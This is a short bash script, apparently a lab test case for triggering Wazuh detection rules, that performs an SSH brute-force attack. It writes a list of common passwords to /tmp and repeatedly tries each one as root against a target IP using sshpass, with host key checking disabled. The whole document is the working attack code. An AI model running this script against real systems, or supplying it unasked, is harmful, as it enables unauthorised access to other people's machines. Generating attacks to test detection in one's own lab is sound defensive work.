#!/bin/bash
# Case 001: SSH Brute-Force (T1110.001)
# Usage: bash attack-ssh-bruteforce.sh <target_ip>

TARGET=${1:-192.168.0.9}
WORDLIST="/tmp/small_passwords.txt"

echo "[*] Preparing wordlist..."
cat > $WORDLIST <<EOF
password
123456
qwerty
admin
root
toor
letmein
12345678
password123
P@ssw0rd
EOF

echo "[*] Starting SSH brute-force against $TARGET"
for i in {1..30}; do
  for pass in $(cat $WORDLIST); do
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
      -o ConnectTimeout=2 root@$TARGET exit 2>/dev/null
  done
done

echo "[+] Attack complete. Check Wazuh dashboard for rules 5760, 5763."